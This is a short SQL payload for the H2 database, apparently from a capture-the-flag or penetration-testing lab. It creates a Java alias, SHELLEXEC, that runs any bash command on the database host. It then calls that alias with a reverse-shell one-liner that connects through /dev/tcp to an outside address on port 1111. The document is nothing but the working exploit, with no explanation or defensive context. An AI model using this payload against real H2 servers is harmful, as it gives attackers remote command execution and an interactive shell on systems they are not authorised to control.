CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
String[] command = {"bash", "-c", cmd};
java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
return s.hasNext() ? s.next() : ""; }
$$;
CALL SHELLEXEC('setsid bash -i &>/dev/tcp/10.10.14.6/1111 0>&1 &')
